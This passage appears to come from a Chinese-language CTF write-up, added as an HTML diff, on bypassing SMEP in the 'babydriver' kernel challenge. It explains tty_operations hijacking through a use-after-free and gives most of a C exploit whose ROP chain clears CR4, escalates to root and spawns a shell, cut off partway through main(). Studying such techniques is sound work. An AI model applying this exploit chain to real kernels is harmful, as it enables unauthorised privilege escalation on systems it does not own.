+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(fd, rop, </span><span style="color:#d08770;">0x500</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">0x6677889A</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0xffffffffffff0000 </span><span style="color:#c0c5ce;">| (</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<h1 id="bypass-smep">bypass smep</h1><p>smep即Supervisor Mode Execution Prevention，管理模式执行保护，禁止内核访问用户空间的代码</p>
+<p>是内核的一种保护措施，作用是当 CPU 处于 ring0 模式时，执行 用户空间的代码会触发页错误；这个保护在 arm 中被称为 PXN。</p>
+<p>是否开启这个保护取决于rc4寄存器的值，第20位是1保护开启，0关闭
+我们一般只需要给它改成一个固定值<strong>0x6f0</strong>就可以关闭</p>
+<p>用之前Kernel UAF的babydriver进行演示</p>
+<h2 id="si-lu">思路</h2><p>本题有uaf</p>
+<p>再<code>open("/dev/ptmx", O_RDWR)</code>时会分配这样一个结构体<code>tty_struct</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_struct {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> magic;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> kref kref;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">device *dev;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_driver *driver;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">const struct </span><span style="color:#c0c5ce;">tty_operations *ops;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> index;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* Protects ldisc changes: Lock tty not pty */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ld_semaphore ldisc_sem;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_ldisc *ldisc;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mutex atomic_write_lock;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mutex legacy_mutex;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mutex throttle_mutex;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rw_semaphore termios_rwsem;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> mutex winsize_mutex;
+</span><span style="color:#c0c5ce;">    spinlock_t ctrl_lock;
+</span><span style="color:#c0c5ce;">    spinlock_t flow_lock;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* Termios values are protected by the termios rwsem */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">ktermios termios, termios_locked;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">termiox *termiox;    </span><span style="color:#65737e;">/* May be NULL for unsupported */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> name[</span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">pid *pgrp;       </span><span style="color:#65737e;">/* Protected by ctrl lock */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">pid *session;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> flags;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> count;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> winsize winsize;     </span><span style="color:#65737e;">/* winsize_mutex */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> stopped:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,    </span><span style="color:#65737e;">/* flow_lock */
+</span><span style="color:#c0c5ce;">              flow_stopped:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">              unused:BITS_PER_LONG - </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> hw_stopped;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> ctrl_status:</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">,    </span><span style="color:#65737e;">/* ctrl_lock */
+</span><span style="color:#c0c5ce;">              packet:</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">              unused_ctrl:BITS_PER_LONG - </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> receive_room;  </span><span style="color:#65737e;">/* Bytes free for queue */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> flow_change;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_struct *link;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">fasync_struct *fasync;
+</span><span style="color:#c0c5ce;">    wait_queue_head_t write_wait;
+</span><span style="color:#c0c5ce;">    wait_queue_head_t read_wait;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> work_struct hangup_work;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*disc_data;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*driver_data;
+</span><span style="color:#c0c5ce;">    spinlock_t files_lock;      </span><span style="color:#65737e;">/* protects tty_files list */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> list_head tty_files;
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">N_TTY_BUF_SIZE </span><span style="color:#d08770;">4096
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> closing;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*write_buf;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> write_cnt;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/* If the tty has a pending do_SAK, queue it here - akpm */
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> work_struct SAK_work;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_port *port;
+</span><span style="color:#c0c5ce;">} __randomize_layout;
+</span></pre>
+<p>在<code>tty_struct</code>结构体中有这样一个结构体<code>tty_operations</code></p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_operations {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_struct * (*lookup)(</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tty_driver *driver,
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">file *filp, int idx);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*install)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_driver *driver, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*remove)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_driver *driver, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*open)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct * tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file * filp);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*close)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct * tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> file * filp);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*shutdown)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*cleanup)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*write)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct * tty,
+</span><span style="color:#c0c5ce;">              </span><span style="color:#b48ead;">const unsigned char </span><span style="color:#c0c5ce;">*buf, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> count);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*put_char)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">unsigned char</span><span style="color:#c0c5ce;"> ch);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*flush_chars)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*write_room)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*chars_in_buffer)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int  </span><span style="color:#c0c5ce;">(*ioctl)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty,
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> cmd, </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> arg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">long </span><span style="color:#c0c5ce;">(*compat_ioctl)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty,
+</span><span style="color:#c0c5ce;">                 </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> cmd, </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> arg);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*set_termios)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> ktermios * old);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*throttle)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct * tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*unthrottle)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct * tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*stop)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*start)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*hangup)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*break_ctl)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> state);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*flush_buffer)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*set_ldisc)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*wait_until_sent)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> timeout);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*send_xchar)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ch);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*tiocmget)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*tiocmset)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty,
+</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> set, </span><span style="color:#b48ead;">unsigned int</span><span style="color:#c0c5ce;"> clear);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*resize)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> winsize *ws);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*set_termiox)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> termiox *tnew);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*get_icount)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty,
+</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> serial_icounter_struct *icount);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*show_fdinfo)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_struct *tty, </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *m);
+</span><span style="color:#b48ead;">#ifdef</span><span style="color:#c0c5ce;"> CONFIG_CONSOLE_POLL
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*poll_init)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_driver *driver, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> line, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*options);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*poll_get_char)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_driver *driver, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> line);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">(*poll_put_char)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tty_driver *driver, </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> line, </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ch);
+</span><span style="color:#b48ead;">#endif
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int </span><span style="color:#c0c5ce;">(*proc_show)(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> seq_file *, </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*);
+</span><span style="color:#c0c5ce;">} __randomize_layout;
+</span></pre>
+<p>里面有很多函数指针，比如write、open之类的，当打开了tty之后，write写入内容，就会调用结构体中的write指针，也就能劫持执行流</p>
+<p>所以可以考虑劫持结构体指针<code>tty_operations</code>指向可控区域，在其中布置函数指针，就会执行伪造的结构体内部的指针</p>
+<p>劫持函数指针，还要思考如果继续利用。这里用的方法是栈迁移，首先通过调试，可以数得write指针对应偏移为+7，对应地址写入<code>babyread</code>地址，然后gdb调试，发现此时rax正好就是fake tty operations结构体开头的地址</p>
+<p><img src="./images/image-20220510014023716.png" alt="" />image-20220510014023716</p>
+<p>那么就可以使用这两条gadget</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">mov rsp,rax ; ??? ; ret
+</span><span style="color:#c0c5ce;">pop rax; pop rbp; ret;
+</span></pre>
+<p>write函数指针处写入第一条gadget，则就会以结构体开头为rsp返回，然后再做rop，返回修改cr4寄存器为0x6f0，然后返回到用户态代码执行提权和getshell。</p>
+<p>exp中getroot是用户态的空间里，存放着内核态函数地址，所以真正执行的代码还是内核态的，只是存放在用户态（没开smap吧）
+同时fake结构体还不能只构造write指针，其他地方不填东西似乎会报错</p>
+<p><img src="./images/image-20220510014726436.png" alt="" />image-20220510014726436</p>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">prepare_kernel_cred_addr </span><span style="color:#d08770;">0xffffffff810a1810
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">commit_creds_addr </span><span style="color:#d08770;">0xffffffff810a1420
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* fake_tty_operations[</span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">size_t user_cs, user_ss, user_rflags, user_sp;
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">mov user_cs, cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">mov user_ss, ss;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">mov user_sp, rsp;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">pushf;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">			&quot;</span><span style="color:#a3be8c;">pop user_rflags;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">			);
+</span><span style="color:#c0c5ce;">	</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]status has been saved.</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">get_shell</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#8fa1b3;">getuid</span><span style="color:#c0c5ce;">()){
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*]Root Now</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Wrong</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">get_root</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* (*func1)(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">) = prepare_kernel_cred_addr;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* (*func2)(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*) = commit_creds_addr;
+</span><span style="color:#c0c5ce;">    (*func2)((*func1)(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    size_t rop[</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">] = {</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">};
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0xffffffff810d238d</span><span style="color:#c0c5ce;">;		</span><span style="color:#65737e;">// pop rdi; ret;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0x6f0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0xffffffff81004d80</span><span style="color:#c0c5ce;">;		</span><span style="color:#65737e;">// mov cr4, rdi; pop rbp; ret; smep banned
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    rop[i++] = (size_t)get_root;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0xffffffff81063694</span><span style="color:#c0c5ce;">;		</span><span style="color:#65737e;">// swapgs; pop rbp; ret;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    rop[i++] = </span><span style="color:#d08770;">0xffffffff814e35ef</span><span style="color:#c0c5ce;">;		</span><span style="color:#65737e;">// iretq; ret;
+</span><span style="color:#c0c5ce;">    rop[i++] = (size_t)get_shell;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_cs;                </span><span style="color:#65737e;">/* saved CS */
+</span><span style="color:#c0c5ce;">    rop[i++] = user_rflags;            </span><span style="color:#65737e;">/* saved EFLAGS */
+</span><span style="color:#c0c5ce;">    rop[i++] = user_sp;
+</span><span style="color:#c0c5ce;">    rop[i++] = user_ss;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; </span><span style="color:#d08770;">30</span><span style="color:#c0c5ce;">; i++)
+</span><span style="color:#c0c5ce;">	{
+</span><span style="color:#c0c5ce;">		fake_tty_operations[i] = </span><span style="color:#d08770;">0xFFFFFFFF8181BFC5</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">	}
+</span><span style="color:#c0c5ce;">    fake_tty_operations[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0xffffffff810635f5</span><span style="color:#c0c5ce;">;  </span><span style="color:#65737e;">//pop rax; pop rbp; ret; rop
+</span><span style="color:#c0c5ce;">    fake_tty_operations[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = (size_t)rop;
+</span><span style="color:#c0c5ce;">    fake_tty_operations[</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0xFFFFFFFF8181BFC5</span><span style="color:#c0c5ce;">;  </span><span style="color:#65737e;">// mov rsp,rax ; dec ebx ; ?? ;ret
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// fake_tty_operations[7] = 0xffffffffc0000000+0x130;  // mov rsp,rax ; dec ebx ; ?? ;ret
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd1 = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/babydev</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd2 = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/dev/babydev</span><span style="color:#c0c5ce;">&quot;, O_RDWR);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd1, </span><span style="color:#d08770;">0x10001</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0x2e0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">close</span><span style="color:#c0c5ce;">(fd1);
+</span><span style="color:#c0c5ce;">
